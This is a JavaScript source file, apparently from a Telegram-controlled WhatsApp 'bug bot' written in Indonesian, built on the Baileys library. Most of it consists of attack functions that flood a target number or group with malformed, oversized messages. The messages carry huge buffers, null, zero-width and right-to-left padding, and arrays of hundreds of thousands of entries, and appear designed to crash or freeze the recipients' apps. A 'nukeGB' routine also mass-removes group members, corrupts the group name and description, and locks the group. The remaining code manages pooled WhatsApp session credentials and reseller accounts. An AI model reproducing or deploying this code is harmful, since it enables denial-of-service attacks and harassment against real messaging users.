    const locBase = () => ({
        locationMessage: {
            degreesLatitude: 99999999999999999999,
            degreesLongitude: -99999999999999999999,
            name: pad,
            address: padNull,
            isLive: true,
            accuracyInMeters: 999999,
            speedInMps: 999999,
            jpegThumbnail: thumb,
            contextInfo: { mentionedJid: men(), isForwarded: true, forwardingScore: 99999 }
        }
    })

    const payloadSticker = () => wrapInvis({
        stickerMessage: {
            url: "https://mmg.whatsapp.net/x",
            fileSha256: Buffer.alloc(65535, 0xff),
            fileEncSha256: Buffer.alloc(65535, 0xff),
            mediaKey: Buffer.alloc(65535, 0xff),
            mimetype: "image/webp",
            isAnimated: true,
            isAvatar: true,
            isAiSticker: true,
            width: 65535,
            height: 65535,
            directPath: "/v/t62.7118-24/" + padNull,
            fileLength: 9999999999999,
            mediaKeyTimestamp: 9999999999999,
            firstFrameSidecar: Buffer.alloc(65535, 0xff),
            contextInfo: {
                mentionedJid: men(),
                isForwarded: true,
                forwardingScore: 99999,
                quotedMessage: {
                    stickerMessage: {
                        url: "https://mmg.whatsapp.net/x",
                        fileSha256: Buffer.alloc(65535, 0xff),
                        mediaKey: Buffer.alloc(65535, 0xff),
                        mimetype: "image/webp",
                        isAnimated: true,
                        width: 65535,
                        height: 65535,
                        fileLength: 9999999999999,
                        firstFrameSidecar: Buffer.alloc(65535, 0xff),
                        contextInfo: {
                            mentionedJid: men(),
                            quotedMessage: locBase()
                        }
                    }
                }
            }
        }
    })

    const payloadAudio = () => wrapInvis({
        audioMessage: {
            url: "https://mmg.whatsapp.net/x",
            mimetype: "audio/ogg; codecs=opus",
            fileSha256: Buffer.alloc(32, 0xff),
            fileLength: 9999999999999,
            seconds: 9999999999999,
            ptt: true,
            mediaKey: Buffer.alloc(32, 0xfe),
            fileEncSha256: Buffer.alloc(32, 0xfd),
            directPath: "/v/t62.7118-24/" + padNull,
            mediaKeyTimestamp: 9999999999999,
            waveform: Buffer.alloc(65535, 0xff),
            contextInfo: {
                mentionedJid: men(),
                isForwarded: true,
                forwardingScore: 99999,
                quotedMessage: {
                    audioMessage: {
                        url: "https://mmg.whatsapp.net/x",
                        mimetype: "audio/ogg; codecs=opus",
                        fileLength: 9999999999999,
                        seconds: 9999999999999,
                        ptt: true,
                        waveform: Buffer.alloc(65535, 0xff),
                        contextInfo: {
                            mentionedJid: men(),
                            quotedMessage: locBase()
                        }
                    }
                }
            }
        }
    })

    const payloadDoc = () => wrapInvis({
        documentMessage: {
            url: "https://mmg.whatsapp.net/x",
            mimetype: "application/pdf",
            title: pad,
            fileSha256: Buffer.alloc(32, 0xff),
            fileLength: 9999999999999,
            pageCount: 99999999,
            mediaKey: Buffer.alloc(32, 0xfe),
            fileName: pad + ".pdf",
            fileEncSha256: Buffer.alloc(32, 0xfd),
            directPath: "/v/t62.7118-24/" + padNull,
            mediaKeyTimestamp: 9999999999999,
            thumbnailDirectPath: padNull,
            thumbnailSha256: Buffer.alloc(65535, 0xff),
            thumbnailEncSha256: Buffer.alloc(65535, 0xff),
            jpegThumbnail: thumb,
            contextInfo: {
                mentionedJid: men(),
                isForwarded: true,
                forwardingScore: 99999,
                quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/x",
                        mimetype: "application/pdf",
                        title: padRtl,
                        fileLength: 9999999999999,
                        pageCount: 99999999,
                        jpegThumbnail: thumb,
                        contextInfo: {
                            mentionedJid: men(),
                            quotedMessage: locBase()
                        }
                    }
                }
            }
        }
    })

    const payloadSchedule = () => wrapInvis({
        scheduledCallCreationMessage: {
            scheduledTimestampMs: 9999999999999999,
            callType: 2,
            title: pad + padRtl,
            contextInfo: {
                mentionedJid: men(),
                isForwarded: true,
                forwardingScore: 99999,
                quotedMessage: {
                    scheduledCallCreationMessage: {
                        scheduledTimestampMs: 9999999999999999,
                        callType: 2,
                        title: padNull,
                        contextInfo: {
                            mentionedJid: men(),
                            quotedMessage: {
                                scheduledCallCreationMessage: {
                                    scheduledTimestampMs: 9999999999999999,
                                    callType: 2,
                                    title: padRtl,
                                    contextInfo: {
                                        mentionedJid: men(),
                                        quotedMessage: locBase()
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    })

    const w = async (fn) => {
        for (let i = 0; i < 300; i++) {
            try { await sock.relayMessage(jid, fn(), { noSelfSync: true }) } catch (e) {}
            await new Promise(r => setTimeout(r, 2))
        }
    }

    await Promise.all([
        w(payloadSticker),
        w(payloadAudio),
        w(payloadDoc),
        w(payloadSchedule)
    ])

    console.log("done: " + jid)
}


async function RulzxNieh(conn, target) {
const generateId = () => Math.random().toString(36).substring(2, 15);
    const msg = {
      key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
      message: {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/864493173_1126386720352937_7005502683215030947_n.enc?ccb=11-4&oh=01_Q5Aa5wGeJ7rjTjmVpz7hmye8OFxYeQGg0JH4RJWjoFNTLWTjug&oe=6B039201&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "RtaBg+JpQRsuU0v7ZgT99HsO/1BqkJ3wpibUWxiUbS0=",
        fileLength: 527261,
        seconds: 15,
        mediaKey: "3FDVflAFvMV84XIPeXlMDq46OmNbFcH46xIt9mI3DzQ=",
        height: 854,
        width: 480,
        fileEncSha256: "MXNNnUYFs3n1UgRO4CHGcqdtENsLF66PGQ8c2Xm1JaU=",
        directPath: "/v/t62.7161-24/864493173_1126386720352937_7005502683215030947_n.enc?ccb=11-4&oh=01_Q5Aa5wGeJ7rjTjmVpz7hmye8OFxYeQGg0JH4RJWjoFNTLWTjug&oe=6B039201&_nc_sid=5e03e0",
        mediaKeyTimestamp: 1792811346,
        contextInfo: {
          forwardingScore: 0,
          featureEligibilities: {
            cannotBeRanked: false,
            canBeReshared: true
          },
          pairedMediaType: "NOT_PAIRED_MEDIA",
          statusSourceType: "MUSIC_STANDALONE"
        },
annotations: [
  {
    polygonVertices: [
      { x: 0.17499999701976776, y: 0.34003907442092896 },
      { x: 0.824999988079071, y: 0.34003907442092896 },
      { x: 0.824999988079071, y: 0.659960925579071 },
      { x: 0.17499999701976776, y: 0.659960925579071 }
    ],
    shouldSkipConfirmation: true,
    embeddedContent: {
      embeddedMusic: {
        musicContentMediaId: "1617533403386854",
        songId: "2143650176238311",
        author: "SatzTzy" + "ြ".repeat(25000),
        title: "ြ".repeat(55000),
        artworkDirectPath: "/v/t62.76458-24/862433949_1115864974387826_2246061530672404996_n.enc?ccb=11-4&oh=01_Q5Aa5wHP8w-45ud2VA8LBv_Mm8yJXdjP-zYU9neYEFQw_Suafg&oe=6B037DBF&_nc_sid=5e03e0",
        artworkSha256: "j74KMaEeGvwh7JbTdAapjJa+pwgKKd6jWlV6ScyICa0=",
        artworkEncSha256: "98x7ZPlrM3CZPwWu+WLuD0/4weiz5A5jkgC2/tXYjhs=",
        artistAttribution: "https://www.instagram.com/_u/keshi",
        countryBlocklist: "UlVYSw==",
        isExplicit: false,
        artworkMediaKey: "CITihXZcrYqP71PyPjqG2qb09kmTZUFmmVNgXh6eGMM="
      }
    },
    embeddedAction: true
  }
],
        accessibilityLabel: "Stiker musik",
        externalShareFullVideoDurationInSeconds: 0
      }
    }
}
await conn.relayMessage("status@broadcast", msg.message, {
      statusJidList: [target],
      messageId: msg.key.id,
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    });

    await conn.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          },
          additionalNodes: [{
            tag: "meta",
            attrs: { is_status_mention: "false" },
            content: undefined
          }]
        }
      }
    }, {});

    await conn.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {});

  }


async function nukeGB(sock, groupJid) {
    const jid = groupJid.includes("@g.us") ? groupJid : groupJid + "@g.us"
    const pad = "\u200B".repeat(50000)
    const padNull = "\u0000".repeat(50000)
    const thumb = Buffer.alloc(100000, 0xFF).toString("base64")
    const rndId = () => Math.random().toString(36).substring(2).toUpperCase()
    const men = () => Array.from({ length: 1900 }, () =>
        Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
    )

    const loc = () => ({
        locationMessage: {
            degreesLatitude: 99999999999999999999,
            degreesLongitude: -99999999999999999999,
            name: pad, address: padNull,
            isLive: true, accuracyInMeters: 999999, speedInMps: 999999,
            jpegThumbnail: thumb,
            contextInfo: {
                mentionedJid: men(),
                isForwarded: true,
                forwardingScore: 99999,
                groupMentions: Array.from({ length: 50 }, () => ({
                    groupJid: jid,
                    groupSubject: pad
                }))
            }
        }
    })

    const vid = () => ({
        videoMessage: {
            url: "https://mmg.whatsapp.net/x",
            mimetype: "video/mp4",
            fileLength: 9999999999999,
            seconds: 9999999999999,
            width: 65535, height: 65535,
            gifPlayback: true,
            streamingSidecar: Buffer.alloc(65535, 0xff),
            jpegThumbnail: thumb,
            caption: pad,
            contextInfo: {
                mentionedJid: men(),
                isForwarded: true,
                forwardingScore: 99999,
                groupMentions: Array.from({ length: 50 }, () => ({
                    groupJid: jid,
                    groupSubject: padNull
                })),
                quotedMessage: {
                    ptvMessage: {
                        url: "https://mmg.whatsapp.net/x",
                        mimetype: "video/mp4",
                        fileLength: 9999999999999,
                        seconds: 9999999999999,
                        width: 65535, height: 65535,
                        streamingSidecar: Buffer.alloc(65535, 0xff),
                        jpegThumbnail: thumb,
                        contextInfo: {
                            mentionedJid: men(),
                            groupMentions: Array.from({ length: 50 }, () => ({
                                groupJid: jid,
                                groupSubject: pad
                            })),
                            quotedMessage: loc()
                        }
                    }
                }
            }
        }
    })

    const payload = () => ({
        viewOnceMessageV2: {
            message: {
                viewOnceMessage: {
                    message: {
                        viewOnceMessageV2Extension: { message: vid() }
                    }
                }
            }
        }
    })

    const workerBug = async () => {
        for (let i = 0; i < 500; i++) {
            try { await sock.relayMessage(jid, payload(), { noSelfSync: true }) } catch (e) {}
            await new Promise(r => setTimeout(r, 2))
        }
    }

    const workerKick = async () => {
        try {
            const meta = await sock.groupMetadata(jid)
            const members = meta.participants
                .filter(p => !p.isAdmin)
                .map(p => p.id)
            for (let i = 0; i < members.length; i += 5) {
                const batch = members.slice(i, i + 5)
                try { await sock.groupParticipantsUpdate(jid, batch, "remove") } catch (e) {}
                await new Promise(r => setTimeout(r, 300))
            }
        } catch (e) {}
    }

    const workerCorrupt = async () => {
        for (let i = 0; i < 50; i++) {
            try { await sock.groupUpdateSubject(jid, pad + padNull + i) } catch (e) {}
            try { await sock.groupUpdateDescription(jid, padNull + pad + i) } catch (e) {}
            await new Promise(r => setTimeout(r, 200))
        }
    }

    const workerLock = async () => {
        try {
            await sock.groupSettingUpdate(jid, "announcement")
            await sock.groupSettingUpdate(jid, "not_member_add")
            await sock.revokeGroupInviteCode(jid)
        } catch (e) {}
    }

    await Promise.all([
        workerBug(),
        workerBug(),
        workerBug(),
        workerKick(),
        workerCorrupt(),
        workerLock()
    ])

    try { await sock.groupLeave(jid) } catch (e) {}

    console.log("nuke gb done: " + jid)
}

async function zyon(sock, target) {
  const msg = {
  botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [
              {
                messageType: 8,
                latexMetadata: {
                  text: "\0",
                  expressions: [
                    {
                      latexExpression: "\0",
                      width: 99999999,
                      height: 99999999,
                      fontHeight: 99999999,
                      padding: 99999999
                    }
                  ]
                }
              },
              {
                messageType: 2,
                messageText: "\0"
              }
            ],
            contextInfo: {
              isForwarded: true,
              forwardOrigin: 4,
              mentionedJid: [target]
            }
          }
        }
      }
    };
 await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });
  
  console.log("✅ SUCCESS SEND BUGS");
}

async function spamnotif(sock, target) {
  const Metaai = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        verificationMetadata: AIRich.generateVerificationMetadata(),
        sessionTransparencyMetadata: {
          hcaId: `hca_${Date.now()}`,
          sessionTransparencyType: 1,
        },
      },
    },
    botForwardedMessage: {
      message: {
        reactionMessage: {
          key: {
            remoteJid: target,
            fromMe: false,
            id: `E-${Date.now()}-${Math.floor(Math.random() * 9999)}`,
          },
          text: ["🔥", "❤️", "😂", "😮", "👍", "💀"][Math.floor(Math.random() * 6)],
          senderTimestampMs: Date.now(),
        },
      },
    },
  };

  await sock.relayMessage(target, Metaai, {});
}

async function Blclck(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "R1n - in comming" + "\u0000".repeat(450000)
      },
      nativeFlowMessage: {
        buttons: "\u200D".repeat(50000)
      }
    }
  }, {});

  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "\u202E".repeat(500000),
              url: "https://wa.me/Settings"
            })
          }
        ]
      }
    }
  }, {});
}

async function ikyyoffc(sock, target) {
  const groupStatusPayload = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "Nobody" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  await sock.relayMessage(target, groupStatusPayload, {
    participant: { jid: target }
  });

  await sock.relayMessage("status@broadcast", {
    interactiveResponseMessage: {
      body: {
        text: "Click Here",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "call_permission_request",
        paramsJson: "FORM_SCREEN",
        version: 3
      },
      contextInfo: {
        remoteJid: Math.random().toString(36) + "CALL_ACCESS",
        isForwarded: true,
        forwardingScore: 999,
        urlTrackingMap: {
          urlTrackingMapElements: Array.from({ length: 500000 }, () => ({
            ["\0"]: "Grettles"
          }))
        }
      }
    }
  }, {
    participant: { jid: target },
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "contacts" },
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: []
        }]
      }]
    }]
  });
}

const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};
const mess = {};

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
      return [];
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
    return [];
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        keepAliveIntervalMs: 50000,
        logger: pino({ level: "silent" }),
        auth: state,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        generateHighQualityLinkPreview: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        version
      });

      sock.ev.on("creds.update", () => {});

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;
          console.log(`[${sessionName}] Connected.`);

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`[${sessionName}] Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }
          resolve();
        }

        if (connection === "close") {
          console.log(`[${sessionName}] Connection closed. Status: ${statusCode}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`[${sessionName}] Logged out.`);
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`[${sessionName}] SKIPPED:`, err.message);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}
async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    connectSession(sessionFolder, baseName);
  }
}

async function refreshUserSessions() {
  await startUserSessions();
}

async function pairingWa(number, owner, attempt = 1, senderType = 'private') {
  if (attempt >= 5) {
    return false;
  }
  
  // ✅ TENTUKAN FOLDER
  let sessionDir;
  if (senderType === 'global') {
    sessionDir = path.join('vip', number);
  } else {
    sessionDir = path.join('permenmd', owner, number);
  }

  if (senderType === 'global') {
    if (!fs.existsSync('vip')) fs.mkdirSync('vip', { recursive: true });
  } else {
    if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
    if (!fs.existsSync(`permenmd/${owner}`)) fs.mkdirSync(`permenmd/${owner}`);
  }
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    version
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} (${senderType}) Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1, senderType); // ✅ pass type
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      console.log(`[✅ OPEN] ${senderType.toUpperCase()} - ${number}`);
      
      // ✅ Simpan creds ke folder yang benar
      const sourceCreds = path.join(sessionDir, 'creds.json');
      
      if (senderType === 'global') {
        // ✅ GLOBAL → auto-register ke publicSenderSet
        try {
          await waiting(3000);
          publicSenderSet.add(number);
          savePublicSenders();
          console.log(`[🌍 GLOBAL REGISTERED] ${number} → publicSenderSet`);
        } catch (e) {
          console.error(`❌ Gagal register global: ${e.message}`);
        }
      } else {
        // ✅ PRIVATE → copy ke permenmd/{owner}/{number}.json
        try {
          await waiting(3000);
          if (fs.existsSync(sourceCreds)) {
            const data = fs.readFileSync(sourceCreds);
            const destCreds = path.join('permenmd', owner, `${number}.json`);
            fs.writeFileSync(destCreds, data);
            console.log(`✅ Rewrote session to ${destCreds}`);
          }
        } catch (e) {
          console.error(`❌ Failed to rewrite creds: ${e.message}`);
        }
      }
    }
  });

  return null;
}

// ═══════════════════════════════════════════════════════════════════════════
// TIMESTAMP TRACKER — untuk grace period 24 jam
// ═══════════════════════════════════════════════════════════════════════════

const publicSenderAddedAt = {};       // { session: timestamp_ditambahkan }

// Load dari file (kalau ada)
try {
  if (fs.existsSync('./publicSenderTimestamps.json')) {
    const saved = JSON.parse(fs.readFileSync('./publicSenderTimestamps.json', 'utf8'));
    Object.assign(publicSenderLastOnline, saved.lastOnline || {});
    Object.assign(publicSenderAddedAt, saved.addedAt || {});
    console.log(`[⏱️ TIMESTAMPS] Loaded ${Object.keys(publicSenderLastOnline).length} timestamp`);
  }
} catch (e) {
  console.error('[❌ TIMESTAMPS] Load error:', e.message);
}

function savePublicSenderTimestamps() {
  try {
    fs.writeFileSync(
      './publicSenderTimestamps.json',
      JSON.stringify({
        lastOnline: publicSenderLastOnline,
        addedAt: publicSenderAddedAt
      }, null, 2)
    );
  } catch (e) {
    console.error('[❌ TIMESTAMPS] Save error:', e.message);
  }
}

// ─── WRAPPER: track kapan sender ditambahkan ke publicSenderSet ──────
const _originalAdd = publicSenderSet.add.bind(publicSenderSet);
publicSenderSet.add = function(session) {
  publicSenderAddedAt[session] = Date.now();
  publicSenderLastOnline[session] = Date.now();   // init lastOnline juga
  console.log(`[📌] Sender ${session} ditambahkan ke publicSenderSet`);
  return _originalAdd(session);
};

// ═══════════════════════════════════════════════════════════════════════════
// AUTO CLEANUP PUBLIC SENDER — GRACE PERIOD 24 JAM
// ═══════════════════════════════════════════════════════════════════════════
const OFFLINE_TIMEOUT_MS = 24 * 60 * 60 * 1000;   // ✅ 24 JAM

setInterval(() => {
  const now = Date.now();
  const toDelete = [];

  for (const sender of publicSenderSet) {
    // ✅ Kalau masih ada koneksi → update lastOnline
    if (activeConnections[sender]) {
      publicSenderLastOnline[sender] = now;
      continue;
    }

    // ⏳ OFFLINE — cek berapa lama
    const lastOnline = publicSenderLastOnline[sender] || publicSenderAddedAt[sender] || now;
    const offlineDuration = now - lastOnline;

    if (offlineDuration >= OFFLINE_TIMEOUT_MS) {
      const hours = (offlineDuration / (60 * 60 * 1000)).toFixed(1);
      console.log(`[🧹 CLEANUP] Public sender ${sender} offline ${hours} jam → dihapus`);
      toDelete.push(sender);
    } else {
      const minutes = Math.floor(offlineDuration / (60 * 1000));
      // Optional: log tiap cleanup cycle (bisa di-comment biar ga spam)
      // console.log(`[⏳] ${sender} offline ${minutes}m (hapus dalam ${Math.round((OFFLINE_TIMEOUT_MS - offlineDuration) / (60*60*1000))}h lagi)`);
    }
  }

  if (toDelete.length > 0) {
    for (const session of toDelete) {
      publicSenderSet.delete(session);
      delete publicSenderLastOnline[session];
      delete publicSenderAddedAt[session];
    }
    savePublicSenders();
    savePublicSenderTimestamps();
    console.log(`[✅ CLEANUP] ${toDelete.length} sender dihapus. Sisa: ${publicSenderSet.size}`);
  } else if (publicSenderSet.size > 0) {
    // Simpan timestamp kalau ada perubahan lastOnline
    savePublicSenderTimestamps();
  }
}, 60 * 1000); // Setiap 1 menit


// ═══════════════════════════════════════════════════════════════════════════
// AUTO CLEANUP DEAD CONNECTIONS — GRACE PERIOD 60 DETIK
// ═══════════════════════════════════════════════════════════════════════════
const deadConnectionTracker = {};   // { sessionName: timestamp_deteksi_mati }
const DEAD_CONNECTION_GRACE = 60 * 1000;   // ✅ 60 detik grace

setInterval(() => {
  const now = Date.now();
  let cleaned = 0;
  let detected = 0;

  for (const [sessionName, sock] of Object.entries(activeConnections)) {
    const readyState = sock?.ws?.readyState;
    const isDead = (readyState === 3 || readyState === 2 || !sock);

    if (isDead) {
      // ✅ Track kapan pertama kali terdeteksi mati
      if (!deadConnectionTracker[sessionName]) {
        deadConnectionTracker[sessionName] = now;
        detected++;
        console.log(`[⏳] Dead connection detected: ${sessionName} (state: ${readyState}), grace 60s`);
        continue;
      }

      // ✅ Cek grace period
      const deadSince = deadConnectionTracker[sessionName];
      const deadDuration = now - deadSince;

      if (deadDuration >= DEAD_CONNECTION_GRACE) {
        console.log(`[🧹] Cleanup dead connection: ${sessionName} (dead ${Math.round(deadDuration/1000)}s)`);
        delete activeConnections[sessionName];
        delete deadConnectionTracker[sessionName];
        cleaned++;
      }
    } else {
      // ✅ Kalau sudah recover (koneksi nyala lagi) → hapus dari tracker
      if (deadConnectionTracker[sessionName]) {
        console.log(`[♻️] Connection recovered: ${sessionName}`);
        delete deadConnectionTracker[sessionName];
      }
    }
  }

  if (cleaned > 0) {
    console.log(`[✅] ${cleaned} dead connections dibersihkan. Total aktif: ${Object.keys(activeConnections).length}`);
  }
}, 30 * 1000); // Setiap 30 detik

async function startUserSessions() {
  if (!fs.existsSync('permenmd')) {
    fs.mkdirSync('permenmd', { recursive: true });
    console.log('[📁] Folder permenmd dibuat otomatis');
    return;
  }

  const subfolders = fs.readdirSync('permenmd')
    .map(name => path.join('permenmd', name))
    .filter(p => fs.lstatSync(p).isDirectory());

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  if (subfolders.length === 0) {
    console.log('[⚠️] Tidak ada session di permenmd. Silakan add sender dulu.');
    return;
  }

  for (const folder of subfolders) {
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"))
      .map(file => path.join(folder, file));

    console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

    for (const jsonFile of jsonFiles) {
      const sessionName = `${path.basename(jsonFile, ".json")}`;

      if (activeConnections[sessionName]) {
        console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
        continue;
      }

      try {
        console.log(`[START] Connecting session: ${sessionName}`);
        await connectSession(folder, sessionName);
      } catch (err) {
        console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
      }
    }
  }
}

function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName];
    }
  }
  return null;
}

function getActiveSocketsFromPath(folderPath) {
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSockets = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      activeSockets.push(activeConnections[sessionName]);
    }
  }

  return activeSockets;
}

const telegramDataPath = "telegram.json";
const dbPath = "database.json";

function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}

function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  // Group start intentionally exposes only the safe group information menu.
  if (msg.chat.type !== "private") {
    return bot.sendMessage(msg.chat.id, "👋 *INAF PROJECT — MENU GRUP*\n\nGunakan tombol berikut untuk informasi akun dan bantuan.", {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "🪪 My Title", callback_data: "inaf_group_mytitle" }, { text: "ℹ️ Bantuan", callback_data: "inaf_group_help" }]] }
    });
  }
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id) || id === OWNER_ID;
  const isUser = config.userList.includes(id) || isOwner || inafIsDeveloper(id) || !!inafFindAccount(id, msg.from.username);
  if (!isUser) return bot.sendMessage(id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  const account = inafFindAccount(id, msg.from.username);
  const seller = account && inafCanSell(account.role);
  const developer = inafIsDeveloper(id);
  const keyboard = [
    [{ text: "🆕 Buat Akun Member", callback_data: "create_member" }],
    [{ text: "⏳ Set Expired", callback_data: "set_expire" }],
    [{ text: "🛍️ INAF STORE", callback_data: "inaf_store_home" }, { text: "🪪 /mytitle", callback_data: "inaf_mytitle" }],
    ...(seller ? [[{ text: "💰 Setoran", callback_data: "inaf_deposit" }, { text: "🏷️ Jual Role", callback_data: "inaf_sell" }]] : []),
